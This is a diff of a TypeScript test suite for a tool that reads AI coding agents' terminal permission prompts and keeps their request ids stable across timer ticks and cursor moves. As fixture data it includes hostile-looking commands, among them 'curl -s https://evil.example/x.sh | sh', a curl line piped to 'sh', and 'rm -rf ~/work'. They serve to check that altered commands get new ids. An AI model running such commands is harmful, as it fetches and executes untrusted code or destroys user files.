@@ -867,8 +867,7 @@ describe('QuestionWatcher on a permission prompt', () => {
 // The id is recomputed on every 1.5s poll (a new id = a new question: the needs-you alert, the sound, the
 // dial push) and again at the moment an answer is typed (a new id = STALE_QUESTION, nothing typed). So it
 // may only change when the QUESTION does — never because a timer ticked, the cursor moved or a box was
-// ticked. Pinned for every captured dialog, so nothing that later widens the id (the whole dialog, say)
-// can make it move with the screen.
+// ticked. Hashing the raw `dialog` broke both halves for every engine that keeps one.
 
 const FIXTURES = join(__dirname, '__fixtures__')
 // SGR and cursor codes, and OSC 8 hyperlinks (grok) — what a person sees is what is left.
@@ -982,6 +981,12 @@ describe('a waiting dialog keeps one requestId', () => {
     expect(tickTimers(paneOf(file), 1)).not.toBe(paneOf(file))
   })
 
+  it.each(['permission-hermes.txt', 'permission-muse.txt', 'question-hermes.txt'])('%s: even though the timer is inside the dialog itself', (file) => {
+    const pane = paneOf(file)
+    expect(viewIn(file, tickTimers(pane, 1)).dialog).not.toBe(viewIn(file, pane).dialog)
+    expect(idIn(file, tickTimers(pane, 1))).toBe(idIn(file, pane))
+  })
+
   it.each(OPEN)('%s: with the cursor on each row', (file) => {
     const pane = paneOf(file)
     const moves = cursorMoves(pane)
@@ -1017,6 +1022,45 @@ describe('a waiting dialog keeps one requestId', () => {
     }
   })
 
+  it('keeps the raw dialog — timer, cursor and all — for the pair floor, which reads it exactly', () => {
+    const view = viewIn('permission-hermes.txt', paneOf('permission-hermes.txt'))
+    expect(view.dialog).toContain('❯ 1. Allow once')
+    expect(view.dialog).toContain('(01m30s · ↓ 82 tok)')
+  })
+})
+
+describe('two different commands are still two requestIds', () => {
+  // The reason the dialog is in the id at all: a command that wraps is only whole there. What was taken
+  // out of it above must never be enough to make two commands look alike.
+  function variants(file: string, from: string, to: [string, string]): [string, string] {
+    const pane = paneOf(file)
+    expect(pane).toContain(from)
+    return [pane.replace(from, to[0]), pane.replace(from, to[1])]
+  }
+
+  const cases: Array<{ file: string; from: string; to: [string, string] }> = [
+    // Claude titles the prompt by the command's FIRST line; the second is only in the dialog.
+    { file: 'permission-claude.txt', from: '   curl -s https://api.coingecko.com/api/v3/simple/price?ids=bitcoin',
+      to: ['   npm test &&\n   git push', '   npm test &&\n   rm -rf ~/work'] },
+    // Codex titles it by the line just above the rows — the LAST line — so the middle one differs.
+    { file: 'permission-codex.txt', from: "  $ printf 'hi\\n' > /private/etc/harness-probe.txt",
+      to: ['  $ npm test &&\n    git status &&\n    git push', '  $ npm test &&\n    rm -rf ~/work &&\n    git push'] },
+    // Hermes titles it by the URL on the second line; the first (`curl -s`) is only in the dialog.
+    { file: 'permission-hermes.txt', from: '│ curl -s ', to: ['│ curl -s ', '│ rm -rf  '] },
+    // Muse: what is being reached, in the body above the command.
+    { file: 'permission-muse.txt', from: 'network: example.com:443 https', to: ['network: example.com:443 https', 'network: evil.example:443 https'] },
+  ]
+
+  it.each(cases)('$file: a different command below its first line', ({ file, from, to }) => {
+    const [a, b] = variants(file, from, to)
+    // main's fingerprint cannot see the difference…
+    expect(wordsOf(viewIn(file, a))).toBe(wordsOf(viewIn(file, b)))
+    // …the id can, with the timers ticking and the cursor anywhere.
+    expect(idIn(file, a)).not.toBe(idIn(file, b))
+    expect(idIn(file, tickTimers(a, 5))).toBe(idIn(file, a))
+    expect(idIn(file, tickTimers(b, 5))).toBe(idIn(file, b))
+    for (const moved of cursorMoves(b)) expect(idIn(file, moved)).not.toBe(idIn(file, a))
+  })
 })
 
 describe('the review\'s simulation: a real QuestionWatcher and AskQuestionController over one pane', () => {
@@ -1085,7 +1129,7 @@ describe('the review\'s simulation: a real QuestionWatcher and AskQuestionContro
     const pane = paneOf('permission-claude.txt')
     const w = world('claude', pane)
     await w.poll()
-    w.show(pane.replaceAll('curl -s https://api.coingecko.com/api/v3/simple/price?ids=bitcoin', 'curl -s https://evil.example/x.sh | sh'))
+    w.show(pane.replace('   curl -s https://api.coingecko.com/api/v3/simple/price?ids=bitcoin', '   curl -s https://api.coingecko.com/api/v3/simple/price?ids=bitcoin\n   | sh'))
     await w.poll()
     expect(w.announced).toHaveLength(2)
     const r = await w.controller.answer({ agentId: 'a1', requestId: w.announced[0], answers: { x: 'Yes' } })
@@ -1181,38 +1225,39 @@ describe('a stale `Approve …` header (regression: a header from an earlier dia
   })
 })
 
-describe('every captured dialog keeps main\'s requestId', () => {
-  // Pinned from main's parser. The fix above only stops a walk at an EARLIER dialog, so no capture of a
+describe('every captured dialog keeps its requestId', () => {
+  // Pinned from this parser before the sweep below: main's fingerprint and the dialog's signature. Bounding
+  // a dialog by the one above it only ever cuts what an EARLIER dialog left on the pane, so no capture of a
   // single dialog may change id: a moved id is a question re-announced to every client, and an answer in
   // flight refused as stale. A new fixture is pinned here by being added to the folder.
   const PINNED: Record<string, string> = {
-    'permission-agy.txt': 'q_60303071',
-    'permission-claude-edit.txt': 'q_e5db8e92',
-    'permission-claude-plan.txt': 'q_ef5fd1bd',
-    'permission-claude.txt': 'q_53cbacbe',
-    'permission-codex.txt': 'q_4dee428d',
-    'permission-commandcode.txt': 'q_b5f70edc',
-    'permission-copilot.txt': 'q_a83deada',
+    'permission-agy.txt': 'q_bca21c05',
+    'permission-claude-edit.txt': 'q_1e726361',
+    'permission-claude-plan.txt': 'q_5a686475',
+    'permission-claude.txt': 'q_3e2bb796',
+    'permission-codex.txt': 'q_0472f3a7',
+    'permission-commandcode.txt': 'q_f044b488',
+    'permission-copilot.txt': 'q_62873249',
     'permission-cursor.txt': 'q_e2102acb',
     'permission-devin.txt': 'q_0ed54a33',
     'permission-grok.txt': 'q_5396976a',
-    'permission-hermes.txt': 'q_b57b7882',
-    'permission-muse.txt': 'q_efbbdf0e',
+    'permission-hermes.txt': 'q_9fe12e7e',
+    'permission-muse.txt': 'q_2d480eba',
     'permission-opencode.txt': 'q_0f7b7b0e',
     'question-agy.txt': 'q_c81fea46',
-    'question-codex.txt': 'q_2b1fb10c',
+    'question-codex.txt': 'q_f50314d5',
     'question-commandcode.txt': 'q_66cbf314',
-    'question-copilot.txt': 'q_c81fea46',
+    'question-copilot.txt': 'q_101c92a4',
     'question-devin-multi.txt': 'q_19c3200e',
     'question-devin.txt': 'q_19a084b7',
     'question-grok.txt': 'q_a5e412d6',
-    'question-hermes.txt': 'q_541f972b',
+    'question-hermes.txt': 'q_58484dc6',
     'question-kilo.txt': 'q_0f7b7b0e',
-    'question-multi.txt': 'q_6945a8c7',
+    'question-multi.txt': 'q_6b6969c5',
     'question-muse.txt': 'q_42c9e375',
-    'question-opencode.txt': 'q_048f35db',
-    'question-single.txt': 'q_f0722383',
-    'question-tabs.txt': 'q_b9207692',
+    'question-opencode.txt': 'q_a71204f9',
+    'question-single.txt': 'q_321279c1',
+    'question-tabs.txt': 'q_76723591',
   }
   const answered = ['─'.repeat(60), ' Bash command', '', '   npm test', '', ' Do you want to proceed?', ' ❯ 1. Yes', '   2. No', '', ' Esc to cancel · Tab to amend', '',
     '⏺ Bash(npm test)', '  ⎿  ok', '']
@@ -1224,6 +1269,18 @@ describe('every captured dialog keeps main\'s requestId', () => {
   it.each(OPEN)('%s: alone, and under an answered prompt in scrollback', (file) => {
     expect(idIn(file, paneOf(file))).toBe(PINNED[file])
     expect(idIn(file, [...answered, paneOf(file)].join('\n'))).toBe(PINNED[file])
+  })
+
+  it('reads muse\'s approval, not the answered question above it (regression)', () => {
+    const pane = [paneOf('question-muse.txt'), paneOf('permission-muse.txt')].join('\n')
+    expect(viewIn('permission-muse.txt', pane)).toMatchObject({ question: '$ curl -s https://example.com', rows: [{ label: 'Yes, proceed (y)' }, { label: expect.stringMatching(/^Yes, don't ask again/) }, { label: expect.stringMatching(/^No/) }] })
+    expect(idIn('permission-muse.txt', pane)).toBe(PINNED['permission-muse.txt'])
+  })
+
+  it('reads Command Code\'s footer-less question, not the answered question above it (regression)', () => {
+    const pane = [paneOf('question-single.txt'), paneOf('question-commandcode.txt')].join('\n')
+    expect(viewIn('question-commandcode.txt', pane).question).toBe('"Cầu vụ" bạn muốn game gì?')
+    expect(idIn('question-commandcode.txt', pane)).toBe(PINNED['question-commandcode.txt'])
   })
 })
 
@@ -1238,26 +1295,21 @@ describe('the dialog read is the LAST one on the pane (regression: an answered d
     const view = parseEngineQuestionPane(engineOf(file), pane)
     return view?.kind === 'question' && view.question ? { ...view, id: questionRequestId('s1', view) } : view
   }
-  /** The capture cut to its own dialog: the fewest last lines that still read as the whole capture does. */
+  /**
+   * The capture cut to its own dialog: the fewest last lines that read as the whole capture does, alone and
+   * under unrelated output. The second half keeps the dialog's own top (a rule, a bullet) in the cut: the
+   * dialog a footer dialog carries reads up to it, and without it would read the output above instead.
+   */
   const ownDialog = (file: string): string => {
     const lines = paneOf(file).split('\n')
     const whole = JSON.stringify(readIn(file, paneOf(file)))
+    const output = `${Array(14).fill('  some earlier output').join('\n')}\n`
+    const same = (top: number) => JSON.stringify(readIn(file, lines.slice(top).join('\n'))) === whole
+      && JSON.stringify(readIn(file, output + lines.slice(top).join('\n'))) === whole
     let top = 0
-    while (top + 1 < lines.length && JSON.stringify(readIn(file, lines.slice(top + 1).join('\n'))) === whole) top++
+    while (top + 1 < lines.length && same(top + 1)) top++
     return lines.slice(top).join('\n')
   }
-
-  it('reads muse\'s approval, not the answered question above it', () => {
-    const view = viewIn('permission-muse.txt', [paneOf('question-muse.txt'), paneOf('permission-muse.txt')].join('\n'))
-    expect(view).toMatchObject({ question: '$ curl -s https://example.com', rows: [{ label: 'Yes, proceed (y)' }, { label: expect.stringMatching(/^Yes, don't ask again/) }, { label: expect.stringMatching(/^No/) }] })
-    expect(idIn('permission-muse.txt', [paneOf('question-muse.txt'), paneOf('permission-muse.txt')].join('\n'))).toBe(idIn('permission-muse.txt', paneOf('permission-muse.txt')))
-  })
-
-  it('reads Command Code\'s footer-less question, not the answered question above it', () => {
-    const pane = [paneOf('question-single.txt'), paneOf('question-commandcode.txt')].join('\n')
-    expect(viewIn('question-commandcode.txt', pane).question).toBe('"Cầu vụ" bạn muốn game gì?')
-    expect(idIn('question-commandcode.txt', pane)).toBe('q_66cbf314')   // its pinned id, alone
-  })
 
   it('sweeps every captured dialog', () => {
     expect(ALL.length).toBeGreaterThanOrEqual(29)
@@ -1274,6 +1326,37 @@ describe('the dialog read is the LAST one on the pane (regression: an answered d
       expect({ other, read: readIn(file, [paneOf(other), paneOf(file)].join('\n')) }).toEqual({ other, read: alone })
       expect({ other, read: readIn(file, [paneOf(other).trimEnd(), own].join('\n')) }).toEqual({ other, read: alone })
     }
+  })
+})
+
+describe('a bare timer line in the dialog keeps the requestId (regression: `waiting 3s` moved it every tick)', () => {
+  // Found end to end: a status line with no parentheses and no ` · ` sat inside the dialog the id hashes,
+  // so every second was a new question: re-announced, and every answer to it refused as stale.
+  const FILE = 'permission-codex.txt'
+  const ASKED = '  Would you like to run the following command?'
+  const withLine = (line: string): string => {
+    expect(paneOf(FILE)).toContain(ASKED)
+    return paneOf(FILE).replace(ASKED, `  ${line}\n${ASKED}`)
+  }
+
+  it.each([
+    'waiting 3s', 'Waiting… 12s', 'thinking 4s', 'Churned for 4s', '✻ Working... 1m30s', '⠼ Fetch Bitcoin price… 1m33s',
+    'Waiting on answers for the command?          4.2s',
+  ])('%s', (status) => {
+    const pane = withLine(status)
+    expect(viewIn(FILE, pane).dialog).toContain(status)
+    expect(tickTimers(pane, 1)).not.toBe(pane)
+    for (const by of [1, 7, 61, 997]) expect(idIn(FILE, tickTimers(pane, by))).toBe(idIn(FILE, pane))
+  })
+
+  it.each([
+    ['sleep 30s', 'sleep 99s'],
+    ['$ timeout 30s npm test', '$ timeout 99s npm test'],
+    ['Reason: retry after 30s', 'Reason: retry after 99s'],
+    ['npm test && sleep 5s', 'npm test && sleep 500s'],
+    ['Waiting on answers for the command?          4.2s', 'Waiting on answers for another command?          4.2s'],
+  ])('keeps the prompt\'s own words and numbers: %s', (a, b) => {
+    expect(idIn(FILE, withLine(a))).not.toBe(idIn(FILE, withLine(b)))
   })
 })
 
